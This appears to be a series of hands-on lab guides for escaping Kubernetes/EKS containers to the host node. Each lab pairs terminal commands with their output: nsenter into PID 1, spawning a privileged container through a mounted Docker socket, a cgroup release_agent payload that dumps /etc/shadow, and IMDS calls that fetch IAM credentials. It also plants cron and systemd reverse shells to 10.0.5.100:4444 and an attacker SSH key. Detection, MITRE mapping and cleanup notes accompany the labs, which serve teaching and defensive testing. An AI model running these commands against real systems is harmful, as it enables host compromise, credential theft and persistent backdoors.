Objective: Escape from a privileged container to the underlying host using nsenter to break into PID 1's namespaces, gaining full host access.
Prerequisites
  • Access to a Kubernetes pod running with securityContext.privileged: true and hostPID: true
  • Basic understanding of Linux namespaces and capabilities
  • nsenter available inside the container (present in most base images)
Authorized testing only. These techniques escape container isolation. Only perform on lab environments or systems where you have explicit written permission.
1
Check if the container is running in privileged mode by examining the effective capabilities bitmask. A value of 0000003fffffffff means all capabilities are granted. Also verify that CAP_SYS_ADMIN is present before attempting namespace-based escapes — it is required for nsenter and mount operations.
Terminal
root@pod-7f8a9b0c:/# cat /proc/1/status | grep -i cap
CapInh: 0000003fffffffff CapPrm: 0000003fffffffff CapEff: 0000003fffffffff CapBnd: 0000003fffffffff CapAmb: 0000000000000000
root@pod-7f8a9b0c:/# # All caps = 0000003fffffffff → PRIVILEGED MODE # Verify CAP_SYS_ADMIN specifically (required for nsenter and mount) capsh --print | grep sys_admin
Current: = cap_chown,cap_dac_override,cap_dac_read_search,...,cap_sys_admin,...+eip Bounding set =...cap_sys_admin...
root@pod-7f8a9b0c:/# # CAP_SYS_ADMIN confirmed — nsenter escape is viable
2
Check if hostPID is enabled by looking for host processes visible from inside the container. If you can see the host's init system (PID 1 = /sbin/init or systemd), hostPID: true is confirmed.
Terminal
root@pod-7f8a9b0c:/# cat /proc/1/cmdline | tr '\0' ' '
/sbin/init
root@pod-7f8a9b0c:/# # PID 1 = /sbin/init → this is the HOST's init, not the container's entrypoint # hostPID = true confirmed
3
Escape to the host using nsenter to enter PID 1's mount, UTS, IPC, network, and PID namespaces. This drops you into a root shell on the underlying EC2/EKS node. The --target 1 references PID 1 on the host — visible because hostPID: true shares the host's PID namespace with the container.
Terminal
root@pod-7f8a9b0c:/# nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
root@ip-10-0-3-42:/#
root@ip-10-0-3-42:/# # We are now on the HOST — not in the container hostname && uname -r
ip-10-0-3-42.ec2.internal 5.10.220-209.878.amzn2.x86_64
Note: On EKS nodes running containerd (the default since EKS 1.24), docker ps is not available. Use crictl instead — see Step 4.
4
Verify you are on the host. On modern EKS nodes using containerd as the CRI, Docker is not installed — use crictl for container runtime interactions.

root@ip-10-0-3-42:/# # On containerd nodes (EKS 1.24+), use crictl — NOT docker # List running containers crictl ps

Detection Notes
  • Alert on pods created with --privileged flag or securityContext.privileged: true in EKS task definitions or pod specs (AWS Security Hub, Falco rule: launch_privileged_container)
  • Monitor for CAP_SYS_ADMIN capability grants in pod security context — this single cap enables most escape techniques
  • Alert on nsenter execution within containers (CloudWatch Container Insights, Falco: nsenter process spawned inside container namespace)
  • Alert on unexpected mount syscalls from container PIDs (seccomp profile violations)
  • CloudTrail: GetCredentials calls to IMDS from an instance that has not previously called it — node role credential theft indicator

  • T1613 — Container and Resource Discovery (crictl ps, crictl images, crictl inspect)
  • T1552.005 — Unsecured Credentials: Cloud Instance Metadata API (IMDSv2, ECS task metadata)
Cleanup
  • Delete the lab pod: kubectl delete pod <pod-name>
  • Rotate any IAM credentials that were accessed from IMDS during the lab
  • Remove any test files written to /proc/1/root or host filesystem paths
Never run containers in privileged mode in production. Use securityContext.privileged: false, drop all capabilities, and add back only what is needed. Enforce this with Pod Security Standards (restricted profile). On EKS, enable hostPID: false and use OPA Gatekeeper or Kyverno to block privileged pods at admission.
Objective: Exploit a mounted Docker socket inside a container to spawn a new privileged container with full host filesystem access. Also covers the cgroup v2 release_agent escape as an alternative technique.
Prerequisites
  • Container with /var/run/docker.sock mounted (typically CI/CD runners: Jenkins, GitLab, Drone)
  • Docker client inside the container, or ability to speak the Docker HTTP API via curl
  • Understanding of Linux cgroup versions — run stat -fc %T /sys/fs/cgroup/ to check
Authorized testing only. Docker socket access is equivalent to root on the host. Only perform on authorized lab environments.
1
Check if the Docker socket is mounted inside the container. If /var/run/docker.sock exists, you have direct access to the Docker daemon on the host — this is effectively root on the host.
Terminal
root@ci-runner-pod:/# ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 Apr 1 06:00 /var/run/docker.sock
root@ci-runner-pod:/# # Socket exists → full Docker API access → game over
2
Use the Docker socket to list all containers running on the host. On EKS/containerd nodes the socket may be absent — in that case the cgroup v2 escape in Step 5 applies instead.
Terminal
root@ci-runner-pod:/# docker ps -a --format "table {{.Names}}\t{{.Image}}\t{{.Status}}"
NAMES IMAGE STATUS k8s_webapp_webapp-pod 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp Up 6 hours k8s_api_api-pod 123456789012.dkr.ecr.us-east-1.amazonaws.com/api Up 6 hours k8s_ci-runner_ci-runner-pod jenkins/inbound-agent:latest Up 2 hours k8s_redis_cache-pod redis:7-alpine Up 6 hours
3
Spawn a new privileged container that mounts the host's root filesystem and shares its PID and network namespaces. Then chroot into the host root.
Terminal
root@ci-runner-pod:/# docker run -it --privileged \ --pid=host --net=host \ -v /:/host \ ubuntu chroot /host bash
root@ip-10-0-3-42:/# # Full host access achieved
root@ip-10-0-3-42:/# id && hostname
uid=0(root) gid=0(root) groups=0(root) ip-10-0-3-42.ec2.internal
4
Access kubelet configuration, other pod secrets, and the host's IAM role credentials via IMDSv2 for cloud-level lateral movement.
Terminal
root@ip-10-0-3-42:/# cat /var/lib/kubelet/kubeconfig | grep server
server: https://ABCDEF1234567890.gr7.us-east-1.eks.amazonaws.com
root@ip-10-0-3-42:/# # IMDSv2 — get token first TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \ -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") curl -H "X-aws-ec2-metadata-token: $TOKEN" \ http://169.254.169.254/latest/meta-data/iam/security-credentials/
eks-node-group-role
5
Alternative technique: cgroup release_agent escape. This works on privileged containers even without Docker socket access. First determine which cgroup version is active — the technique differs between v1 and v2.
Terminal
root@privileged-pod:/# # Check cgroup version stat -fc %T /sys/fs/cgroup/
tmpfs
root@privileged-pod:/# # tmpfs = cgroup v1. If output is cgroup2fs, skip to the v2 note below. # cgroup v1 release_agent escape: mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp mkdir /tmp/cgrp/x echo 1 > /tmp/cgrp/x/notify_on_release host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab) echo "$host_path/cmd" > /tmp/cgrp/release_agent # Write the payload script to the host path echo '#!/bin/sh' > /cmd echo "cat /etc/shadow > $host_path/output" >> /cmd chmod a+x /cmd # Trigger: create a process in the cgroup and let it exit sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" # Wait for the kernel to fire the release_agent sleep 1 && cat /output | head -3
root:$6$rounds=5000$SALT$HASH...:19900:0:99999:7::: daemon:*:19900:0:99999:7::: bin:*:19900:0:99999:7:::
root@privileged-pod:/# # HOST's /etc/shadow — we executed as root on the host via cgroup v1
cgroup v2 note: On kernels using cgroup v2 (detected by stat -fc %T /sys/fs/cgroup/ returning cgroup2fs), the release_agent file does not exist. On v2 hosts, use the eBPF-based escape (requires CAP_BPF) or fall back to the nsenter / /proc/1/root techniques from Lab L01, which work regardless of cgroup version.
Attack Flow
Docker Socket
→
docker run --privileged
→
chroot /host
→
Full Host Root
Detection Notes
  • Alert on container startup with /var/run/docker.sock volume mount (ECS task definition scan, Falco rule: launch_sensitive_mount_container)
  • Alert on mount syscalls involving cgroup filesystem types from inside a container
  • Alert on writes to /sys/fs/cgroup/*/release_agent (kernel audit, Falco)
  • Monitor for unexpected docker run or crictl run commands spawned by CI/CD service accounts
MITRE ATT&CK Mapping
  • T1611 — Escape to Host (Docker socket, cgroup release_agent)
  • T1613 — Container and Resource Discovery (docker ps, crictl ps)
  • T1552.005 — Unsecured Credentials: Cloud Instance Metadata API (IMDSv2)
Cleanup
  • Remove escape artifacts: rm -f /cmd /output (from the host filesystem)
  • Unmount cgroup: umount /tmp/cgrp and rmdir /tmp/cgrp/x /tmp/cgrp
  • Delete any privileged containers spawned via Docker socket
  • Rotate IMDS-derived IAM credentials if accessed
Docker socket mount = root on host. This is the most common container escape vector. Never mount /var/run/docker.sock into application containers. For CI/CD runners, use rootless Docker, Kaniko, or Buildah instead. The cgroup v1 release_agent escape requires a kernel older than the backport patches (most AL2/AL2023 EKS AMIs are patched for v1 but check your AMI version).
Objective: Escape from a container with a hostPath volume mount by writing persistence mechanisms (crontab, SSH keys, systemd services) to the host filesystem.
Prerequisites
  • Container with a hostPath volume mounting a writable portion of the host filesystem
  • Write access to the mounted host path from within the container
  • Basic understanding of Linux cron, SSH authorized_keys, and systemd service units
1
Identify hostPath volume mounts inside the container. Any mount pointing to a host directory gives write access to the host filesystem at that path.
Terminal
root@monitoring-pod:/# mount | grep -E "hostPath|/host"
/dev/nvme0n1p1 on /host-vol type xfs (rw,relatime,attr2,inode64,logbufs=8) /dev/nvme0n1p1 on /host-logs type xfs (rw,relatime,attr2,inode64,logbufs=8)
root@monitoring-pod:/# ls /host-vol/
bin boot dev etc home lib lib64 opt proc root run sbin srv sys tmp usr var
root@monitoring-pod:/# # /host-vol is the HOST's root filesystem!
2
Write a cron backdoor to the host filesystem. The host's cron daemon will execute it, giving a reverse shell from the host itself — not from inside the container.
Terminal
root@monitoring-pod:/# echo '*/1 * * * * root bash -c "bash -i >& /dev/tcp/10.0.5.100/4444 0>&1"' \ > /host-vol/etc/cron.d/backdoor root@monitoring-pod:/# chmod 0644 /host-vol/etc/cron.d/backdoor
3
Alternative persistence: write an SSH public key to the host's root authorized_keys for direct SSH access that survives pod deletion.
Terminal
root@monitoring-pod:/# mkdir -p /host-vol/root/.ssh root@monitoring-pod:/# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...attacker-key" \ >> /host-vol/root/.ssh/authorized_keys root@monitoring-pod:/# chmod 700 /host-vol/root/.ssh root@monitoring-pod:/# chmod 600 /host-vol/root/.ssh/authorized_keys
4
Alternative persistence: write a systemd service that starts on boot and maintains a persistent reverse shell connection.
Terminal
root@monitoring-pod:/# cat > /host-vol/etc/systemd/system/debug-agent.service <<'EOF' [Unit] Description=Debug Agent Service After=network-online.target Wants=network-online.target [Service] Type=simple ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/10.0.5.100/4444 0>&1; sleep 300; done' Restart=always RestartSec=60 [Install] WantedBy=multi-user.target EOF
root@monitoring-pod:/# # Enable via symlink (no systemctl inside container) ln -sf /etc/systemd/system/debug-agent.service \ /host-vol/etc/systemd/system/multi-user.target.wants/debug-agent.service
5
Wait for the persistence mechanism to trigger. The cron backdoor fires within 1 minute, giving a host-level reverse shell.
Terminal
$ # On attacker machine — wait for callback nc -nlvp 4444
Listening on 0.0.0.0 4444 Connection received on 10.0.3.42 51234 root@ip-10-0-3-42:/# whoami root root@ip-10-0-3-42:/# hostname ip-10-0-3-42.ec2.internal root@ip-10-0-3-42:/# # This shell is on the HOST — not in the container
Attack Flow
Pod with hostPath
→
Write /etc/cron.d
→
Host cron runs
→
Reverse Shell
Detection Notes
  • Alert on new files written to /etc/cron.d/, /root/.ssh/authorized_keys, or /etc/systemd/system/ from container PIDs (auditd, Falco)
  • Monitor for unexpected processes spawned by cron with network connections to external IPs
  • Restrict hostPath volumes via OPA Gatekeeper or Kyverno — deny mounts of /, /etc, /root
MITRE ATT&CK Mapping
  • T1611 — Escape to Host (hostPath write)
  • T1053.003 — Scheduled Task/Job: Cron (crontab backdoor)
  • T1098.004 — Account Manipulation: SSH Authorized Keys
  • T1543.002 — Create or Modify System Process: Systemd Service
Cleanup
  • Remove cron backdoor: rm /host-vol/etc/cron.d/backdoor
  • Remove SSH key: edit /host-vol/root/.ssh/authorized_keys and remove the attacker key
  • Disable and remove systemd service: rm /host-vol/etc/systemd/system/debug-agent.service and the wants symlink
  • Delete the lab pod: kubectl delete pod monitoring-pod
Avoid hostPath volumes in production. Use emptyDir, persistentVolumeClaim, or CSI drivers instead. If hostPath is required, set readOnly: true and restrict to specific subdirectories — never mount /.

Objective: From a pod with hostNetwork: true, use packet sniffing to intercept other pods' AWS credentials being exchanged via the EKS Pod Identity HTTP endpoint.
Prerequisites
  • Access to a pod configured with hostNetwork: true
  • EKS cluster using Pod Identity (not IRSA) — Pod Identity uses 169.254.170.23
  • tcpdump installable or pre-installed in the container image
  • Note: AWS has patched newer EKS Pod Identity agent versions to encrypt credential delivery — this technique applies to unpatched versions

Verify the pod is running with hostNetwork: true by checking for host-level network interfaces (eth0, eni-xxx) instead of the typical veth pair.

Install tcpdump if not already available.

Detection Notes
  • Alert on pods with hostNetwork: true outside of kube-system namespace (Falco, OPA Gatekeeper)
  • Alert on tcpdump or raw socket opens (AF_PACKET) from container processes (Falco rule: launch_package_management_processes)
  • Unusual GetCredentials or AssumeRoleWithWebIdentity call volume from a single node warrants investigation

Cleanup
